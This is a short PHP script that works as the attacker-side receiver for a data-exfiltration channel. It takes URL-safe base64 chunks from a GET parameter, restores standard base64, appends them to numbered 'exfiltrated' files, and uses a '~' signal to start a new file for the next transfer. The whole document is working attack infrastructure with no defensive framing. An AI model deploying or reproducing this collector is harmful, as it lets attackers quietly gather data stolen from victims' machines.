<?php
 $Data = $_GET['input'];
 $seq_number = trim(file_get_contents("seq.txt"));
 if(strcmp($Data, '~') !== 0){
    $File = "exfiltrated{$seq_number}.txt";
    $Handle = fopen($File, 'a');
    $replace_plus = str_replace("-","+",$Data);
    $replace_slash = str_replace("_","/",$replace_plus);
    fwrite($Handle, $replace_slash);
    fclose($Handle);
 }else if(strcmp($Data, '~') == 0){
    echo "test";
    $file = "seq.txt";
    file_put_contents($file,str_replace($seq_number,$seq_number+1,file_get_contents($file)));
 }
?>
